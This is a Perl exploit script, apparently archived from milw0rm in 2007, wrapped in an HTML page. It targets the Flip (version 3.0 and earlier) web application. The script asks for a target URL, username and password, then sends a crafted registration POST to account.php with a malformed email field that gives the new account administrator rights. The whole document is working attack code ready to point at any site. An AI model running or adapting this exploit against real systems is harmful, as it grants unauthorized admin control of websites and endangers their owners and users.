<html><head><title>Flip <= 3.0 Remoe Admin Creation Exploit</title></head><pre>#!/usr/bin/perl

use strict; 
use IO::Socket;
use Getopt::Std;

my $app = &quot;Flip &lt;= 3.0&quot;;
my $type = &quot;Admin Creation&quot;;
my $author = &quot;undefined1_&quot;;
my $vendor = &quot;http://sourceforge.net/projects/flipsource&quot;;

my %opt;
getopts(&quot;t:&quot;, \%opt);
$| = 1;
print &quot;:: $app $type - by $author - www.undef1.com ::\n\n\n&quot;;

my $url = $opt{t} || usage();

if($url =~ m/^(?:http:\/\/)(.*)/) {
	$url = $1;
}
if($url !~ m/^.*\/$/) {
	$url .= &quot;/&quot;;
}

print &quot;username you want: &quot;;
my $user = &lt;STDIN&gt;;
print &quot;password you want: &quot;;
my $pass = &lt;STDIN&gt;;
chomp($user);
chomp($pass);

create_admin($url, $user, $pass);

sub create_admin {
	my $url = shift;
	my $user = shift;
	my $pass = shift;
	
	print &quot;creating admin ... \t&quot;;
	my $content  = &quot;un=$user&amp;em=aaa][3\@gmail.com&amp;pw1=$pass&amp;pw2=$pass&quot;;
	my $data = &quot;POST &quot; . parse_page($url . &quot;account.php?op=register&quot;) . &quot; HTTP/1.1\r\n&quot;;
	$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
	$data .= &quot;Connection: close\r\n&quot;;
	$data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$data .= &quot;Content-Length: &quot; . length($content) . &quot;\r\n\r\n&quot;;
	my $recv = sendpacket(parse_host($url), parse_port($url), $data.$content);

	if($recv !~ m/Successfully registered!/m) {
		print &quot;failed\n&quot;;
		return;
	}	
	print &quot;OK\n&quot;;		
}



# ======================================================

sub parse_host {
	my $url = shift;
	if($url =~ m/^([^\/:]+).*\//) {
		return $1;
}
	return &quot;127.0.0.1&quot;;
}

sub parse_port {
	my $url = shift;
	if($url =~ m/^(?:[^\/:]+):(\d+)\//) {
		return $1;
}
	return &quot;80&quot;;
}

sub parse_page {
	my $url = shift;
	if($url =~ m/^(?:[^\/]+)(\/.*)/) {
		return $1;
	}
	return &quot;/&quot;;
}


sub sendpacket {
	my $server = shift;
	my $port = shift;
	my $data = shift;

	my $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $server, PeerPort =&gt; $port) or die &quot;:: Could not connect to $server:80 $!\n&quot;;
	print $sock &quot;$data&quot;;
	
	$data = &quot;&quot;;
	my $resp;
	while($resp = &lt;$sock&gt;)	{ $data .= $resp; }
	
	close($sock);
	return $data;
}

sub usage() {
	printf &quot;usage: %s -t&lt;url&gt;\n&quot;, $0;
	exit;
}

# milw0rm.com [2007-09-20]</pre></html>